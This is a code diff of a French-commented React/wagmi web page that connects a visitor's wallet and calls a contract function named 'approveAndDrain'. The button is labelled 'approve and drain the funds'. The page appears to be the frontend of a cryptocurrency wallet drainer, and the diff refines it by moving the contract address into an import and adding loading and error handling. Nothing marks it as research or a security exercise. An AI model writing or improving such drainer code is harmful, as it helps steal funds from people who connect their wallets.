@@ -1,5 +1,6 @@
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useContractRead, useContractWrite } from "wagmi";
+import { contractAddress } from "./contractAddress"; // Import du fichier contractAddress.js
 
 // ABI du contrat
 const contractAbi = [
@@ -92,21 +93,18 @@ const contractAbi = [
   }
 ];
 
-// Adresse du contrat sous type string
-const contractAddress: string = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse du contrat
-
 export default function Home() {
   const { isConnected, address } = useAccount();
 
   // Lire le owner du contrat
-  const { data: owner } = useContractRead({
+  const { data: owner, isError, isLoading } = useContractRead({
     address: contractAddress,
     abi: contractAbi,
     functionName: "owner",
   });
 
   // Écrire sur le contrat
-  const { write: approveAndDrain, isLoading } = useContractWrite({
+  const { write: approveAndDrain, isLoading: isWriting } = useContractWrite({
     address: contractAddress,
     abi: contractAbi,
     functionName: "approveAndDrain",
@@ -118,9 +116,15 @@ export default function Home() {
       {isConnected ? (
         <>
           <p>Connecté en tant que : {address}</p>
-          <p>Propriétaire du contrat : {owner?.toString() || "Chargement..."}</p>
-          <button disabled={isLoading} onClick={() => approveAndDrain()}>
-            {isLoading ? "Transaction en cours..." : "Approuver et vider les fonds"}
+          {isLoading ? (
+            <p>Chargement du propriétaire du contrat...</p>
+          ) : isError ? (
+            <p>Erreur lors de la récupération du propriétaire.</p>
+          ) : (
+            <p>Propriétaire du contrat : {owner || "Inconnu"}</p>
+          )}
+          <button disabled={isWriting} onClick={() => approveAndDrain()}>
+            {isWriting ? "Transaction en cours..." : "Approuver et vider les fonds"}
           </button>
         </>
       ) : (
